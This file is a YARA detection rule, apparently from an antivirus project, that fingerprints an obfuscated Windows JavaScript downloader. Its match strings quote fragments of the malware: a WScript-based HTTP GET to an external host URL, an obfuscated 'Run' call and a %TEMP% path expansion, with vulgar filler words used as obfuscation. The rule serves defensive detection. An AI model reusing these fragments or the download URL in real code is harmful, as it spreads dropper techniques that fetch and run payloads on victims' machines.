rule sig_20160428_f71a123ad42fadbdefe38db3592ac111 {
  meta:
    description = "datamaliciousorder - file 20160428_f71a123ad42fadbdefe38db3592ac111.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ad3a8dbc2919e37b77a15c19be742ef9b269ef3c54ebf092423ec7afc6063bbf"

  strings:
    $s1  = "RplOlxAneKisYkeWqzLys[YesIieSlrCjqLhhPosHuq](\"G\" + \"ET\", \"http://yury2.nichost.ru/i7dksa\", false);" fullword ascii
    $s2  = "function AmqXvaIflQrdLhtDgrJrt(XefRcjDsuEweAopEkrXgx){GhbFueHvpWrbCytMwlUuv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function PlwVbrEscTpiGydAddPky() {return GhbFueHvpWrbCytMwlUuv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function AmqXvaIflQrdLhtDgrJrt(XefRcjDsuEweAopEkrXgx){GhbFueHvpWrbCytMwlUuv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "return YpgMihTrcZjgBkfBbnFcu - WpkZzaDzzRlzGatEqvPsa;};" fullword ascii
    $s6  = "function VrwCizZqiGqiBluIlePxp(YpgMihTrcZjgBkfBbnFcu, WpkZzaDzzRlzGatEqvPsa){TijWdhIaoXutRfwGrvMxs = TijWdhIaoXutRfwGrvMxs * 1; " ascii
    $s7  = "var GhbFueHvpWrbCytMwlUuv = function OdlTgfHehMtsWceTuiJro() {return YojMbiIbiLavRjpRdrBvt[TkaSlqWxzFpvAtsQqfFhg](\"WScript\"+\"" ascii
    $s8  = "var YojMbiIbiLavRjpRdrBvt = this[\"WScript\"];" fullword ascii
    $s9  = "var GhbFueHvpWrbCytMwlUuv = function OdlTgfHehMtsWceTuiJro() {return YojMbiIbiLavRjpRdrBvt[TkaSlqWxzFpvAtsQqfFhg](\"WScript\"+\"" ascii
    $s10 = "function PlwVbrEscTpiGydAddPky() {return GhbFueHvpWrbCytMwlUuv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function VrwCizZqiGqiBluIlePxp(YpgMihTrcZjgBkfBbnFcu, WpkZzaDzzRlzGatEqvPsa){TijWdhIaoXutRfwGrvMxs = TijWdhIaoXutRfwGrvMxs * 1; " ascii
    $s12 = "function LjyEchKgwXthUswEohSps(){return IbsRhpTciOwmFemRxfSnf + \"\";};" fullword ascii
    $s13 = "if (RplOlxAneKisYkeWqzLys[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function UocVxrJkjJyuQtvSywMqu() {return ((LteMkoMajWxjPxcSomGqi == true) && (LteMkoMajWxjPxcSomGqi == OcfKieJvaJhlAvsUlpRsl)) ?" ascii
    $s15 = "function UocVxrJkjJyuQtvSywMqu() {return ((LteMkoMajWxjPxcSomGqi == true) && (LteMkoMajWxjPxcSomGqi == OcfKieJvaJhlAvsUlpRsl)) ?" ascii
    $s16 = "function VypCtwGfwPkcWjuBvzZsd(){return TkaSlqWxzFpvAtsQqfFhg;};" fullword ascii
    $s17 = "function YirNddFvmRroXmhFouWdi(MisDokQfzLbiExqDswMpx) {var XalDbcJvdYflNowTtpKll = (1, 2, 3, 4, 5, MisDokQfzLbiExqDswMpx); retur" ascii
    $s18 = "function YirNddFvmRroXmhFouWdi(MisDokQfzLbiExqDswMpx) {var XalDbcJvdYflNowTtpKll = (1, 2, 3, 4, 5, MisDokQfzLbiExqDswMpx); retur" ascii
    $s19 = "return VrwCizZqiGqiBluIlePxp(1 == 1 ? RfdVevWezOnsDqrTdyRgc : 0, 1 == 1 ? XjmGphVzyJemIcwSyvOkz : 0);" fullword ascii
    $s20 = "OcfKieJvaJhlAvsUlpRsl = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}